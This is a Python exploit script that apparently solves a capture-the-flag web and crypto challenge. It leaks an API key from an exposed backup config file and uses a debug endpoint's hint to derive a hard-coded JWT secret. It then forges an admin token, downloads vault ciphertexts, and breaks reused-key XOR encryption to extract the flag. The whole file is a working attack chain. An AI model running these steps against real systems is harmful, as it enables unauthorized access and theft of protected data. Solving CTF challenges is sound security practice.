#!/usr/bin/env python3

import requests
import json
import jwt        
from itertools import combinations

BASE_URL = "http://...."   


def get_api_key() -> str:
    r = requests.get(f"{BASE_URL}/backup/config.json.bak")
    r.raise_for_status()
    data = r.json()
    key = data.get("api_key") or data.get("apiKey") or data.get("key")
    print(f"[*] API key: {key}")
    return key


def get_jwt_secret(api_key: str) -> str:
    r = requests.get(
        f"{BASE_URL}/api/v1/debug",
        headers={"X-API-Key": api_key}
    )
    r.raise_for_status()
    hint = r.json().get("secret_derivation_hint", "")
    print(f"[*] Hint: {hint}")
    # "Company name (lowercase) concatenated with founding year"
    secret = "cryptovault2026"
    print(f"[*] Derived JWT secret: {secret}")
    return secret


def forge_jwt(secret: str) -> str:
    token = jwt.encode(
        {"sub": "rad", "role": "admin", "exp": 9999999999},
        secret,
        algorithm="HS256"
    )
    print(f"[*] Forged JWT: {token[:40]}…")
    return token


def get_ciphertexts(token: str) -> list[bytes]:
    r = requests.get(
        f"{BASE_URL}/api/v1/vault/messages",
        headers={"Authorization": f"Bearer {token}"}
    )
    r.raise_for_status()
    raw = r.json()
    ciphertexts = [bytes.fromhex(c) for c in raw]
    print(f"[*] Retrieved {len(ciphertexts)} ciphertexts")
    return ciphertexts


def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def recover_key(ciphertexts: list[bytes], known_prefix: bytes = b"apoorvctf{") -> bytearray:
    max_len = max(len(c) for c in ciphertexts)
    key     = bytearray(b"\x00" * max_len)
    known   = bytearray(b"\x00" * max_len) 

    for ct in ciphertexts:
        for i, (kb, cb) in enumerate(zip(known_prefix, ct)):
            key[i]   = cb ^ kb
            known[i] = 1


    for c1, c2 in combinations(ciphertexts, 2):
        xored = xor_bytes(c1, c2)
        for i, v in enumerate(xored):
            if known[i]:
                continue
            if (0x41 <= v <= 0x5A) or (0x61 <= v <= 0x7A):
                candidate = c1[i] ^ 0x20
                key[i]   = candidate
                known[i] = 1

    return key


def decrypt_all(ciphertexts: list[bytes], key: bytearray) -> list[str]:
    results = []
    for ct in ciphertexts:
        pt = xor_bytes(ct, key[:len(ct)])
        results.append(pt.decode("ascii", errors="replace"))
    return results


def main():
    api_key = get_api_key()
    secret  = get_jwt_secret(api_key)
    token   = forge_jwt(secret)
    cts     = get_ciphertexts(token)

    key      = recover_key(cts)
    messages = decrypt_all(cts, key)

    print("\n[*] Decrypted messages:")
    for i, m in enumerate(messages):
        print(f"  [{i:02d}] {m}")

    flag_line = next((m for m in messages if "apoorvctf{" in m), None)
    if flag_line:
        start = flag_line.index("apoorvctf{")
        end   = flag_line.index("}", start) + 1
        print(f"\n[+] FLAG: {flag_line[start:end]}")


if __name__ == "__main__":
    main()